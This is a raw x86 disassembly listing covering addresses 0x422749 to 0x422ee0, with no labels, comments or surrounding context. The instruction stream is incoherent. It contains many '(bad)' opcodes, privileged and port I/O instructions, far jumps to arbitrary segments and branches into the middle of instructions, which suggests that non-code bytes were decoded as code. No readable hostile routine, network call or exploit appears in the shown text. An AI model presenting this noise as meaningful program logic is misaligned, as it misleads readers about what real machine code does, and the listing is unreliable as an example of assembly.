  422749:	jmp    0x2c3a:0x97b5fb32
  422750:	push   ds
  422751:	push   ebx
  422752:	fnstenv [ebx+eiz*4-0x7]
  422756:	scas   al,BYTE PTR es:[edi]
  422757:	fldenv [eax]
  422759:	je     0x422722
  42275b:	into   
  42275c:	fs pop esi
  42275e:	mov    esp,0xfd4e936f
  422763:	jmp    0x3f668872
  422768:	pusha  
  422769:	cli    
  42276a:	jne    0x4227dd
  42276c:	mov    DWORD PTR [ecx-0x65],edi
  42276f:	popa   
  422770:	std    
  422771:	adc    BYTE PTR [ecx-0x55],0x6e
  422775:	dec    ebx
  422776:	lods   eax,DWORD PTR ds:[esi]
  422777:	push   0x4f
  422779:	into   
  42277a:	mov    ebx,0x7cd1d9ed
  42277f:	xchg   ebx,eax
  422780:	jbe    0x4227c4
  422782:	or     BYTE PTR [ebx+0x3b8a1bf4],ch
  422788:	xchg   edi,eax
  422789:	sub    al,0xc6
  42278b:	add    al,0xc5
  42278d:	retf   
  42278e:	inc    edi
  42278f:	or     DWORD PTR [ebx+esi*1-0x1b],eax
  422793:	jae    0x42279b
  422795:	mov    ch,0xab
  422797:	add    edx,edi
  422799:	hlt    
  42279a:	dec    esp
  42279b:	jb     0x422764
  42279d:	push   0xf314d46f
  4227a2:	and    BYTE PTR [edi+edx*1+0x7a],dl
  4227a6:	ja     0x422747
  4227a8:	popf   
  4227a9:	mov    eax,0x9bb6f37b
  4227ae:	jne    0x4227c2
  4227b0:	cli    
  4227b1:	inc    esi
  4227b2:	rol    BYTE PTR [ebp-0x20350175],1
  4227b8:	sub    eax,0xdaa70b04
  4227bd:	xor    DWORD PTR [ecx+0x404b7983],ebx
  4227c3:	and    al,0x81
  4227c5:	aaa    
  4227c6:	dec    edx
  4227c7:	popf   
  4227c8:	jp     0x4227ff
  4227ca:	add    DWORD PTR fs:0xe3c69659,edi
  4227d1:	popa   
  4227d2:	lahf   
  4227d3:	jp     0x422849
  4227d5:	inc    ecx
  4227d6:	sahf   
  4227d7:	cmc    
  4227d8:	out    0x95,al
  4227da:	into   
  4227db:	dec    edi
  4227dc:	xchg   BYTE PTR [ecx],dl
  4227de:	je     0x422761
  4227e0:	sub    dl,al
  4227e2:	mov    gs,WORD PTR [eax-0x68c1b561]
  4227e8:	dec    eax
  4227e9:	out    dx,al
  4227ea:	and    BYTE PTR [ecx-0x76],dl
  4227ed:	je     0x4227d6
  4227ef:	add    DWORD PTR [esi-0x50],0x50
  4227f3:	in     al,dx
  4227f4:	push   ebp
  4227f5:	sub    esp,DWORD PTR [edx]
  4227f7:	adc    DWORD PTR [esi],ebx
  4227f9:	xchg   ecx,eax
  4227fa:	mov    dl,0xa4
  4227fc:	popf   
  4227fd:	pop    ecx
  4227fe:	mov    gs,WORD PTR [edi]
  422800:	enter  0x3f9c,0x45
  422804:	(bad)  [ebp+edi*4-0x3abf820]
  42280b:	les    ebp,FWORD PTR [edx-0x6b]
  42280e:	push   ds
  42280f:	inc    BYTE PTR [esp+ebx*1]
  422812:	outs   dx,DWORD PTR ds:[esi]
  422813:	je     0x4227e7
  422815:	data16 jl 0x422826
  422818:	das    
  422819:	lahf   
  42281a:	mov    dh,0x1f
  42281c:	mov    ds:0xb1928fa7,eax
  422821:	add    eax,0x756c80bf
  422826:	dec    esi
  422827:	loopne 0x422873
  422829:	in     eax,0x5d
  42282b:	aaa    
  42282c:	adc    BYTE PTR [edx+ebp*2],ah
  42282f:	mov    WORD PTR [eax],?
  422831:	add    BYTE PTR [eax-0x389d33e0],bl
  422837:	outs   dx,BYTE PTR ds:[esi]
  422838:	setns  BYTE PTR [esi-0xd]
  42283c:	jb     0x4227d6
  42283e:	inc    edi
  42283f:	mov    ch,0x21
  422841:	loopne 0x42287a
  422843:	daa    
  422844:	mov    ebp,0xcd0d5a6
  422849:	push   cs
  42284a:	cmp    ch,BYTE PTR [edi]
  42284c:	(bad)  
  42284d:	mov    ecx,0x70ff0b5f
  422852:	call   0x24c7:0x42745175
  422859:	pop    ecx
  42285a:	dec    ecx
  42285b:	dec    esp
  42285c:	jne    0x422875
  42285e:	xchg   ecx,eax
  42285f:	mov    ds:0x305e997b,al
  422864:	leave  
  422865:	push   0xffffff9b
  422867:	sbb    bh,bl
  422869:	mov    ds:0xb14db8d6,eax
  42286e:	call   DWORD PTR [esi+0x19e0e58d]
  422874:	mov    ds:0x740a3a00,al
  422879:	mov    ch,0xc3
  42287b:	fld    TBYTE PTR ss:[ebx+0x4]
  42287f:	mov    cl,0x99
  422881:	add    eax,0x5806c29f
  422886:	pop    ebp
  422887:	cs inc ebp
  422889:	push   ecx
  42288a:	(bad)  
  42288c:	adc    ah,cl
  42288e:	cdq    
  42288f:	repz sbb eax,0x948fbcf2
  422895:	jge    0x422904
  422897:	ins    BYTE PTR es:[edi],dx
  422898:	dec    edx
  422899:	pop    ss
  42289a:	xor    ecx,0x70
  42289d:	repnz test al,0x7a
  4228a0:	addr16 add dh,ah
  4228a3:	push   esi
  4228a4:	adc    al,0xb2
  4228a6:	push   0xffffffee
  4228a8:	inc    esp
  4228a9:	mov    es,WORD PTR [edi-0x6e8ed68]
  4228af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228b0:	dec    eax
  4228b1:	es mov ?,ecx
  4228b4:	jns    0x42287d
  4228b6:	xchg   ecx,eax
  4228b7:	xor    ah,BYTE PTR [edx+0x6a5c3667]
  4228bd:	mov    dh,0xa
  4228bf:	push   cs
  4228c0:	test   DWORD PTR [ebx],edx
  4228c2:	xchg   ecx,eax
  4228c3:	pop    ecx
  4228c4:	dec    eax
  4228c6:	test   al,0x13
  4228c8:	lods   eax,DWORD PTR ds:[esi]
  4228c9:	es call 0x3e65122d
  4228cf:	stc    
  4228d0:	loopne 0x422876
  4228d2:	add    BYTE PTR [eax-0xf6d7bd8],dh
  4228d8:	or     al,0x42
  4228da:	add    eax,0x5d0b5751
  4228df:	imul   esi,DWORD PTR [esi+0x6194c8b6],0xb24204b1
  4228e9:	sub    ebp,ebx
  4228eb:	pop    esp
  4228ec:	cmp    esi,DWORD PTR [ebp+esi*4+0x3b37415d]
  4228f3:	rcr    DWORD PTR [edi-0x71],cl
  4228f6:	icebp  
  4228f7:	dec    edi
  4228f8:	xor    eax,0x613135ba
  4228fd:	sub    eax,0x5ebfcc44
  422902:	push   edx
  422903:	ret    0x7a15
  422906:	xchg   al,dh
  422908:	pop    ds
  422909:	hlt    
  42290a:	call   0x365a:0xc1dac91
  422911:	lahf   
  422912:	test   DWORD PTR [ebp-0x4c],0x45070bf3
  422919:	scas   al,BYTE PTR es:[edi]
  42291a:	or     esi,esi
  42291c:	scas   eax,DWORD PTR es:[edi]
  42291d:	aam    0xdc
  42291f:	and    eax,0x59ec9b01
  422924:	pop    ss
  422925:	jno    0x42294e
  422927:	jp     0x42298b
  422929:	inc    esp
  42292a:	push   esp
  42292b:	pop    ecx
  42292c:	fst    DWORD PTR [ecx-0xf]
  42292f:	pop    esi
  422930:	sbb    dh,BYTE PTR [esp+eax*8+0x5a3be9a6]
  422937:	pop    edi
  422938:	repnz inc edi
  42293a:	inc    ebp
  42293b:	xchg   BYTE PTR [esi+0x56e62a69],al
  422941:	stos   DWORD PTR es:[edi],eax
  422942:	cmp    edx,DWORD PTR [esi-0x6616cc82]
  422948:	pop    eax
  422949:	pop    esp
  42294a:	xor    eax,0x7da7844f
  42294f:	jns    0x422993
  422951:	out    0xa9,al
  422953:	test   al,0x6a
  422955:	sbb    ebp,DWORD PTR [edx]
  422957:	ficomp DWORD PTR [ecx+ecx*2+0x58]
  42295b:	scas   al,BYTE PTR es:[edi]
  42295c:	add    BYTE PTR [ebp-0x64],bl
  42295f:	inc    esp
  422960:	iret   
  422961:	pop    ebx
  422962:	sbb    DWORD PTR [esi+0x22],edx
  422965:	and    ah,BYTE PTR [ebp+0x7123ea33]
  42296b:	hlt    
  42296c:	rcl    BYTE PTR [edx],cl
  42296e:	lds    eax,FWORD PTR [esi+0x9]
  422971:	xor    DWORD PTR [edi+0x2d],eax
  422974:	loop   0x422997
  422976:	stos   BYTE PTR es:[edi],al
  422977:	(bad)  
  422978:	ss (bad) 
  42297a:	jecxz  0x422974
  42297c:	xchg   esi,eax
  42297d:	mov    edx,0x6eee1c6d
  422982:	stc    
  422983:	lock repnz leave 
  422986:	xor    dh,BYTE PTR [ebx]
  422988:	inc    eax
  422989:	ss (bad) 
  42298b:	pop    ebp
  42298c:	gs push 0x373e58d5
  422992:	inc    edi
  422993:	mov    ds:0xc064a168,eax
  422998:	cmp    edi,ecx
  42299a:	mov    DWORD PTR [ebx],0xbfe8eb53
  4229a0:	dec    edx
  4229a1:	fcomi  st,st(3)
  4229a3:	dec    edx
  4229a4:	jns    0x422976
  4229a6:	mov    dh,0x5
  4229a8:	in     eax,0xc4
  4229aa:	xchg   al,cl
  4229ac:	sahf   
  4229ad:	nop
  4229ae:	cmp    DWORD PTR [edi-0x32a8667c],ecx
  4229b4:	xor    edi,DWORD PTR [ebp+0x3c]
  4229b7:	xor    eax,0xeec76c86
  4229bc:	or     eax,0xc7b88592
  4229c1:	mov    cl,cl
  4229c3:	dec    ecx
  4229c4:	add    eax,0x5100aae3
  4229c9:	push   edi
  4229ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229cb:	inc    ecx
  4229cc:	mov    dh,BYTE PTR [edi+eiz*2]
  4229cf:	sbb    edi,esp
  4229d1:	push   ss
  4229d2:	rcr    DWORD PTR [eax-0x1e],1
  4229d5:	(bad)  
  4229d6:	das    
  4229d7:	or     al,ch
  4229d9:	inc    ecx
  4229da:	call   0x4a387a75
  4229df:	mov    ds:0x11bc3eeb,eax
  4229e4:	xor    BYTE PTR [ebx+0x2c0d5acb],0xa9
  4229eb:	dec    esi
  4229ec:	xchg   esp,ecx
  4229ee:	inc    edi
  4229ef:	cmp    ch,cl
  4229f1:	ret    0x4cc7
  4229f4:	paddd  mm5,mm6
  4229f7:	std    
  4229f8:	rcr    BYTE PTR [ebx-0x4a],1
  4229fb:	xor    eax,0xd67fbe32
  422a00:	ss mov ch,0x9
  422a03:	inc    esi
  422a04:	inc    esi
  422a05:	int3   
  422a06:	or     eax,0x1c0a9fd0
  422a0b:	imul   esp,DWORD PTR [esi+0x15cd1939],0xffffff95
  422a12:	sbb    al,0x62
  422a14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a15:	test   eax,0xf2a247a6
  422a1a:	sbb    DWORD PTR [ebp+ecx*8-0xb],esi
  422a1e:	xor    BYTE PTR [edx+esi*2+0x38375d72],ah
  422a25:	xor    BYTE PTR [eax-0xf],dl
  422a28:	loope  0x422a37
  422a2a:	imul   ecx,edi,0xffffffa0
  422a2d:	xchg   edi,eax
  422a2e:	fwait
  422a2f:	adc    DWORD PTR [ebx+0x7f5d95c4],edx
  422a35:	ins    BYTE PTR es:[edi],dx
  422a36:	mov    BYTE PTR [esi+0x2f],dh
  422a39:	mov    ds:0x9030faca,al
  422a3e:	and    ah,BYTE PTR [edx+0x13e8372a]
  422a44:	mov    ecx,0x2fa2b659
  422a49:	add    DWORD PTR [esi-0x33],ecx
  422a4c:	adc    bl,BYTE PTR [ebp+0x381856a3]
  422a52:	inc    eax
  422a53:	push   ebp
  422a54:	outs   dx,BYTE PTR ds:[esi]
  422a55:	scas   al,BYTE PTR es:[edi]
  422a56:	jbe    0x4229e1
  422a58:	xor    eax,0x5bec7327
  422a5d:	adc    bh,ah
  422a5f:	cmp    eax,0x5a5e3820
  422a64:	push   0xfffffff5
  422a66:	retf   0xc0f6
  422a69:	sti    
  422a6a:	int    0x39
  422a6c:	(bad)  
  422a6d:	xor    bh,ch
  422a6f:	push   ds
  422a70:	add    bl,dl
  422a72:	sti    
  422a73:	add    esi,ebp
  422a75:	mov    bh,0xe6
  422a77:	xchg   DWORD PTR [edi+0x16],edx
  422a7a:	adc    BYTE PTR [edx],ah
  422a7c:	icebp  
  422a7d:	dec    edx
  422a7e:	neg    BYTE PTR [ecx+0x3257cc1d]
  422a84:	popf   
  422a85:	loope  0x422a09
  422a87:	jns    0x422a85
  422a89:	inc    edx
  422a8a:	(bad)  
  422a8b:	pusha  
  422a8c:	push   esi
  422a8d:	jmp    0x9837:0xc4203fb1
  422a94:	aas    
  422a95:	retf   
  422a96:	fsub   QWORD PTR [edi-0xd]
  422a99:	idiv   DWORD PTR [ebx]
  422a9b:	adc    DWORD PTR fs:[edx],0xffffff95
  422a9f:	in     eax,dx
  422aa0:	jg     0x422adb
  422aa2:	mov    ebx,0xb33eade0
  422aa7:	xchg   ebx,eax
  422aa8:	xchg   esp,eax
  422aa9:	outs   dx,DWORD PTR ds:[esi]
  422aaa:	pop    ebx
  422aab:	lahf   
  422aac:	mov    bh,0xbc
  422aae:	pop    ecx
  422aaf:	fdiv   DWORD PTR [esi+ecx*4+0x180548a9]
  422ab6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ab7:	xchg   edx,eax
  422ab8:	adc    al,bh
  422aba:	push   ebx
  422abb:	push   edx
  422abc:	or     DWORD PTR [ebx],0xd0a12e85
  422ac2:	call   0x8496:0x87e0005b
  422ac9:	fmul   QWORD PTR [ebx+esi*1-0x57]
  422acd:	xor    BYTE PTR [edi+0x41b5d64f],bh
  422ad3:	stos   BYTE PTR es:[edi],al
  422ad4:	pop    edi
  422ad5:	mov    BYTE PTR [ecx-0x1d],dl
  422ad8:	scas   eax,DWORD PTR es:[edi]
  422ad9:	icebp  
  422ada:	icebp  
  422adb:	(bad)
  422ade:	jmp    0x422ac2
  422ae0:	mov    eax,ds:0x5bbecb33
  422ae5:	cdq    
  422ae6:	pop    esi
  422ae7:	push   0xffffffaf
  422ae9:	mov    eax,ds:0xdc46fddd
  422aee:	stc    
  422aef:	scas   eax,DWORD PTR es:[edi]
  422af0:	aad    0xcd
  422af2:	sub    DWORD PTR [ebp+ebp*8-0x21cf8163],ecx
  422af9:	mov    bl,0xaa
  422afb:	xor    eax,esp
  422afd:	lea    ecx,[ebp+0x12]
  422b00:	fild   QWORD PTR [eax]
  422b02:	jecxz  0x422a95
  422b04:	call   0xc93e:0x5afea8b0
  422b0b:	cmc    
  422b0c:	mov    cl,0xa
  422b0e:	mov    dh,0x20
  422b10:	call   0x5344:0x13e4f8f9
  422b17:	jecxz  0x422af6
  422b19:	je     0x422ad6
  422b1b:	jg     0x422b65
  422b1d:	pop    ebx
  422b1e:	cdq    
  422b1f:	fisttp DWORD PTR [eax-0x8d0894]
  422b25:	test   DWORD PTR [esi],edx
  422b27:	dec    esp
  422b28:	or     edi,DWORD PTR ds:0x6e66c7df
  422b2e:	outs   dx,DWORD PTR ds:[esi]
  422b2f:	xor    ch,bl
  422b31:	pusha  
  422b32:	pusha  
  422b33:	loopne 0x422b3f
  422b35:	sbb    BYTE PTR [esi],0x5a
  422b38:	ins    BYTE PTR es:[edi],dx
  422b39:	xchg   ecx,eax
  422b3a:	repnz sub ebp,ebp
  422b3d:	popa   
  422b3e:	jmp    0x422b19
  422b40:	lods   eax,DWORD PTR ds:[esi]
  422b41:	lea    esp,[esi-0x73383af0]
  422b47:	fcom   DWORD PTR [ebx-0x59]
  422b4a:	bound  edx,QWORD PTR [ebx]
  422b4c:	mov    edi,0x8236cc30
  422b51:	outs   dx,DWORD PTR ds:[esi]
  422b52:	int    0x8d
  422b54:	out    0x63,eax
  422b56:	mov    dh,0xb8
  422b58:	sub    eax,0x8f605f4a
  422b5d:	in     al,dx
  422b5e:	inc    esp
  422b5f:	push   cs
  422b60:	dec    ebp
  422b61:	ins    BYTE PTR es:[edi],dx
  422b62:	aam    0x4e
  422b64:	and    ebp,ecx
  422b66:	xor    ebx,ebp
  422b68:	xchg   esi,eax
  422b69:	add    dh,BYTE PTR [edi]
  422b6b:	jbe    0x422b8a
  422b6d:	or     eax,0xc9c4c537
  422b72:	pusha  
  422b73:	and    ebp,DWORD PTR [eax-0x25]
  422b76:	shl    BYTE PTR [ebx+0x47cffb3f],1
  422b7c:	pop    esp
  422b7d:	nop
  422b7e:	mov    eax,ds:0x212e80f3
  422b83:	adc    al,0xc9
  422b85:	xor    al,0xbf
  422b87:	and    DWORD PTR [eax-0x4661308a],edi
  422b8d:	jno    0x422be6
  422b8f:	pop    ecx
  422b90:	xchg   ebx,eax
  422b91:	sbb    eax,esp
  422b93:	push   esp
  422b94:	xor    DWORD PTR [ecx+0x7e],edx
  422b97:	loopne 0x422b56
  422b99:	lds    esp,FWORD PTR [edi-0x12]
  422b9c:	lods   al,BYTE PTR ds:[esi]
  422b9d:	push   ds
  422b9e:	(bad)  
  422ba0:	push   esp
  422ba1:	add    DWORD PTR [ebp+0x4cb885e0],0xffffffd1
  422ba8:	inc    ebx
  422ba9:	dec    edx
  422baa:	push   esi
  422bab:	aad    0xc9
  422bad:	addr16 and ecx,0x73
  422bb1:	mov    bh,0xe2
  422bb3:	aad    0xd0
  422bb5:	inc    esi
  422bb6:	add    cl,BYTE PTR [esi+0x14]
  422bb9:	js     0x422b61
  422bbb:	dec    esp
  422bbc:	nop
  422bbd:	gs cmc 
  422bbf:	jmp    DWORD PTR [eax]
  422bc1:	jmp    0x422be4
  422bc3:	jbe    0x422b7e
  422bc5:	and    BYTE PTR [eax-0x39],0x10
  422bc9:	clc    
  422bca:	jle    0x422b5c
  422bcc:	inc    ecx
  422bcd:	inc    DWORD PTR [ebp-0x7f]
  422bd0:	out    0x54,al
  422bd2:	push   cs
  422bd3:	sbb    BYTE PTR [eax],cl
  422bd5:	add    ebp,DWORD PTR [eax]
  422bd7:	mov    edi,0x779db566
  422bdc:	mov    dl,0xec
  422bde:	scas   al,BYTE PTR es:[edi]
  422bdf:	push   ebx
  422be0:	lods   eax,DWORD PTR ds:[esi]
  422be1:	jge    0x422bf3
  422be3:	out    dx,al
  422be4:	xchg   esi,eax
  422be5:	jns    0x422bc2
  422be7:	push   esi
  422be8:	test   eax,0x586b9d59
  422bed:	frstor [eax]
  422bef:	hlt    
  422bf0:	bound  eax,QWORD PTR [ebp+0x2ab5db03]
  422bf6:	sti    
  422bf7:	ins    BYTE PTR es:[edi],dx
  422bf8:	add    BYTE PTR ss:[ecx+0x5b],0x93
  422bfd:	les    ebp,FWORD PTR [ecx-0x67]
  422c00:	jmp    0x33b6:0xbf4443e6
  422c07:	cmp    BYTE PTR [ecx-0x1c],cl
  422c0a:	xor    DWORD PTR [eax+0x3bb52471],edi
  422c10:	pop    edx
  422c11:	stc    
  422c12:	push   ss
  422c13:	inc    ebx
  422c14:	or     ecx,DWORD PTR [ebx-0x2e]
  422c17:	in     eax,0x56
  422c19:	inc    esi
  422c1a:	test   BYTE PTR [eax+esi*1],cl
  422c1d:	push   edx
  422c1e:	push   ecx
  422c1f:	jl     0x422c2b
  422c21:	sar    DWORD PTR [eax+0x517cf5ed],1
  422c27:	fstp   st(6)
  422c29:	pop    esi
  422c2a:	add    bh,BYTE PTR [ebx]
  422c2c:	or     eax,0xc7da468
  422c31:	test   al,0x33
  422c33:	enter  0x9618,0xf4
  422c37:	enter  0xaeb2,0xa8
  422c3b:	aaa    
  422c3c:	es xchg esi,eax
  422c3e:	and    ah,BYTE PTR [ebp+0x3cac7b62]
  422c44:	outs   dx,BYTE PTR ds:[esi]
  422c45:	and    ebx,DWORD PTR [ecx+0x3487158]
  422c4b:	sub    eax,DWORD PTR [ebp+0xd460877]
  422c51:	fsubr  DWORD PTR [ecx+0x65fc0e5d]
  422c57:	cs push ebp
  422c59:	inc    esp
  422c5a:	jmp    0x422cc4
  422c5c:	aam    0x0
  422c5e:	in     al,0x74
  422c60:	mov    ebp,edx
  422c62:	or     BYTE PTR [edx-0x15],bh
  422c65:	repz dec edi
  422c67:	inc    ecx
  422c68:	js     0x422c6e
  422c6a:	ret    
  422c6b:	jg     0x422c7b
  422c6d:	test   BYTE PTR [edx-0x5e],ah
  422c70:	mov    bl,0xc0
  422c72:	or     eax,0x29f9bf2
  422c77:	or     edi,DWORD PTR [eax]
  422c79:	inc    edi
  422c7a:	in     eax,dx
  422c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c7c:	mov    edi,0xf7d61d64
  422c81:	pop    es
  422c82:	push   edi
  422c83:	outs   dx,DWORD PTR ds:[esi]
  422c84:	xor    eax,0xb003f092
  422c89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c8a:	popa   
  422c8b:	push   es
  422c8c:	mov    esi,edi
  422c8e:	sbb    DWORD PTR [ebp-0x7cced455],edx
  422c94:	into   
  422c95:	xchg   esp,eax
  422c96:	div    al
  422c98:	popf   
  422c99:	cmp    al,BYTE PTR [edx+0xd92315b]
  422c9f:	jb     0x422d15
  422ca1:	ss mov bl,0x0
  422ca4:	stos   DWORD PTR es:[edi],eax
  422ca5:	out    0x59,eax
  422ca7:	jmp    0xcd0defc1
  422cac:	jecxz  0x422d1b
  422cae:	xor    BYTE PTR [ecx+eiz*4+0x65722956],ch
  422cb5:	(bad)  
  422cb6:	pop    esi
  422cb7:	mov    ebx,0xa3ada15a
  422cbc:	mov    bh,BYTE PTR [ecx-0x1]
  422cbf:	sbb    BYTE PTR [edx-0x58],0x6d
  422cc3:	jb     0x422ca7
  422cc5:	in     eax,dx
  422cc6:	cmp    ch,dl
  422cc8:	add    esi,esi
  422cca:	mov    WORD PTR [esp+ecx*4+0x5],ss
  422cce:	jp     0x422c8b
  422cd0:	inc    edx
  422cd1:	dec    ebp
  422cd2:	or     eax,DWORD PTR [edx+eax*4]
  422cd5:	or     BYTE PTR [edx],dh
  422cd7:	mov    esi,0xf52f952a
  422cdc:	dec    edx
  422cdd:	loop   0x422d50
  422cdf:	mov    ecx,0x556dd2ab
  422ce4:	mov    WORD PTR ds:0x1a5f5790,?
  422cea:	outs   dx,DWORD PTR ds:[esi]
  422ceb:	je     0x422cc5
  422ced:	ret    0x4a66
  422cf0:	push   esp
  422cf1:	outs   dx,DWORD PTR ds:[esi]
  422cf2:	shl    BYTE PTR [eax+0x4a6d94da],0x11
  422cf9:	out    0xc7,al
  422cfb:	mov    edi,0xc28954c8
  422d00:	aad    0x31
  422d02:	or     BYTE PTR [ecx-0x3d6dfdac],bl
  422d08:	cs in  al,dx
  422d0a:	add    BYTE PTR [edi-0x69],dh
  422d0d:	mov    edx,0x966a4013
  422d12:	xchg   edx,eax
  422d13:	call   0xa7d84c73
  422d18:	xchg   ebx,eax
  422d19:	call   0xee4a:0xbcca6cff
  422d20:	dec    ecx
  422d21:	add    eax,0x515a6c94
  422d26:	das    
  422d27:	xchg   edx,eax
  422d28:	cwde   
  422d29:	push   0x35
  422d2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d2c:	xchg   edx,eax
  422d2d:	dec    ebx
  422d2e:	jns    0x422d94
  422d30:	xchg   ecx,eax
  422d31:	push   cs
  422d32:	adc    bl,ah
  422d34:	adc    eax,0xf8a05e6
  422d39:	pop    esp
  422d3a:	imul   edi,DWORD PTR [edx+0x51],0xffffffd6
  422d3e:	cdq    
  422d3f:	mov    ds:0xba52f50b,al
  422d44:	xchg   BYTE PTR ds:0x95b7916f,cl
  422d4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d4b:	cdq    
  422d4c:	cmp    cl,BYTE PTR [esi-0x5e]
  422d4f:	outs   dx,BYTE PTR ds:[esi]
  422d50:	hlt    
  422d51:	out    0x80,al
  422d53:	mov    ch,0xa3
  422d55:	ror    DWORD PTR [ebx+0x225a5382],1
  422d5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d5c:	repnz fbld TBYTE PTR [ecx-0x47]
  422d60:	mov    DWORD PTR [esi+ebp*4+0x69842c91],ecx
  422d67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d68:	jg     0x422d10
  422d6a:	scas   eax,DWORD PTR es:[edi]
  422d6b:	fimul  WORD PTR [eax+0x66]
  422d6e:	sbb    bl,BYTE PTR [ecx-0x29]
  422d71:	jg     0x422d74
  422d73:	mov    dl,0x82
  422d75:	out    0x9f,al
  422d77:	cmc    
  422d78:	and    eax,0x4c30c1c9
  422d7d:	push   eax
  422d7e:	jo     0x422dad
  422d80:	dec    ebp
  422d81:	fcmovb st,st(4)
  422d83:	jne    0x422dbb
  422d85:	or     DWORD PTR [ecx],ebp
  422d87:	fcomp  QWORD PTR [edx-0x4]
  422d8a:	push   eax
  422d8b:	aas    
  422d8c:	sub    al,0xc2
  422d8e:	pop    eax
  422d8f:	repnz ins DWORD PTR es:[edi],dx
  422d91:	popf   
  422d92:	sub    DWORD PTR [edx],0x1
  422d95:	inc    ecx
  422d96:	arpl   WORD PTR [edx],bx
  422d98:	cmp    ah,BYTE PTR [edx+ebx*1+0x573983de]
  422d9f:	inc    edi
  422da0:	mov    al,0x4b
  422da2:	retf   0xfcae
  422da5:	pop    ecx
  422da6:	aas    
  422da7:	shl    cl,0x2f
  422daa:	push   esi
  422dab:	pop    esi
  422dac:	call   FWORD PTR [ecx]
  422dae:	mov    WORD PTR [edi+0x60],?
  422db1:	pusha  
  422db2:	in     eax,dx
  422db3:	sbb    al,0xa0
  422db5:	lods   eax,DWORD PTR ds:[esi]
  422db6:	jmp    DWORD PTR [ebx]
  422db8:	or     DWORD PTR [ecx+edi*2+0xd],esp
  422dbc:	ret    0x2e43
  422dbf:	sbb    ecx,edi
  422dc1:	dec    ecx
  422dc2:	xor    al,0xb7
  422dc4:	mov    edi,0xd4339b35
  422dc9:	inc    eax
  422dca:	and    edx,esi
  422dcc:	sub    DWORD PTR [ecx-0x1d],edi
  422dcf:	jne    0x422de7
  422dd1:	sar    edx,cl
  422dd3:	mov    ecx,0xb4d0dbbc
  422dd8:	std    
  422dd9:	nop
  422dda:	(bad)  
  422ddb:	mov    esp,0xe029acd6
  422de0:	sbb    edx,DWORD PTR [ebx]
  422de2:	mov    ah,0xee
  422de4:	jae    0x422e10
  422de6:	adc    eax,0x2f9bd1ec
  422deb:	sub    dh,BYTE PTR [edi+eax*2]
  422dee:	adc    ah,BYTE PTR [esi]
  422df0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422df1:	jp     0x422e64
  422df3:	pop    esi
  422df4:	dec    edx
  422df5:	rcr    bl,cl
  422df7:	sbb    ecx,esp
  422df9:	cmp    edx,ecx
  422dfb:	out    0x58,eax
  422dfd:	mov    ds:0x51cb5809,al
  422e02:	push   eax
  422e03:	pop    ebx
  422e04:	xchg   ebp,eax
  422e05:	xchg   edx,eax
  422e06:	and    eax,0xdeef730b
  422e0b:	repz or bh,BYTE PTR es:[ebp-0x67]
  422e10:	jae    0x422e2b
  422e12:	ss xchg esp,eax
  422e14:	or     al,0xbd
  422e16:	xchg   edx,eax
  422e17:	mov    ch,0x1c
  422e19:	lods   eax,DWORD PTR ds:[esi]
  422e1a:	aam    0xf5
  422e1c:	jl     0x422de0
  422e1e:	(bad)  
  422e1f:	dec    ebp
  422e20:	add    eax,0xdcde1d03
  422e25:	adc    ebx,DWORD PTR [eax+0x37db038]
  422e2b:	cmp    esi,DWORD PTR [esi+esi*4]
  422e2e:	mov    ah,ah
  422e30:	rcr    DWORD PTR [edi+0x3fd878ae],0x6e
  422e37:	popf   
  422e38:	das    
  422e39:	arpl   cx,si
  422e3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e3c:	shl    eax,cl
  422e3e:	pop    ds
  422e3f:	ja     0x422ebb
  422e41:	inc    ecx
  422e42:	hlt    
  422e43:	cli    
  422e44:	pushf  
  422e45:	dec    esi
  422e46:	daa    
  422e47:	inc    esp
  422e48:	xchg   ebp,eax
  422e49:	inc    ebx
  422e4a:	gs push ebx
  422e4c:	mul    DWORD PTR ds:[edi]
  422e4f:	dec    ebp
  422e50:	and    eax,0x26731d3d
  422e55:	adc    eax,edx
  422e57:	mov    ch,0x47
  422e59:	jns    0x422de2
  422e5b:	push   esp
  422e5c:	div    bl
  422e5e:	xor    ah,bh
  422e60:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e62:	retf   0x3a93
  422e65:	or     al,0x32
  422e67:	(bad)  
  422e69:	jmp    0xec2c7441
  422e6e:	or     DWORD PTR [ebx+0x6f650040],eax
  422e74:	and    esi,0x40
  422e77:	lds    ebx,FWORD PTR [ecx-0x12]
  422e7a:	pop    eax
  422e7b:	mov    edi,esp
  422e7d:	mov    eax,fs:0x625a9b71
  422e83:	and    cl,cl
  422e85:	pop    esp
  422e86:	sbb    BYTE PTR [esp+eax*8+0x6d],cl
  422e8a:	loope  0x422e78
  422e8c:	and    eax,0x3349dca8
  422e91:	jmp    0x5da2:0xec3396c3
  422e98:	frstor [ebx+0x3308a8ee]
  422e9e:	stc    
  422e9f:	sti    
  422ea0:	jno    0x422e51
  422ea2:	add    al,0x94
  422ea4:	imul   ebx,DWORD PTR [edx-0x3fca6cfa],0x5d
  422eab:	pop    es
  422eac:	ror    DWORD PTR [esi-0x64],cl
  422eaf:	lea    ebx,[edi]
  422eb1:	rcl    BYTE PTR [edi+0x3695f410],0x2a
  422eb8:	xchg   ebp,eax
  422eb9:	adc    al,0x43
  422ebb:	sub    al,0xdb
  422ebd:	jecxz  0x422f27
  422ebf:	nop
  422ec0:	mov    ds:0xe08d1182,eax
  422ec5:	xor    BYTE PTR [edi],dh
  422ec7:	add    al,0x79
  422ec9:	mov    ah,0x52
  422ecb:	push   esi
  422ecc:	stc    
  422ecd:	xchg   BYTE PTR [edx+ecx*2-0x63556ea0],al
  422ed4:	nop
  422ed5:	lods   eax,DWORD PTR ds:[esi]
  422ed6:	fs rol eax,0x5d
  422eda:	push   eax
  422edb:	xor    al,0xcf
  422edd:	aam    0xb7
  422edf:	push   esp
  422ee0:	cli    
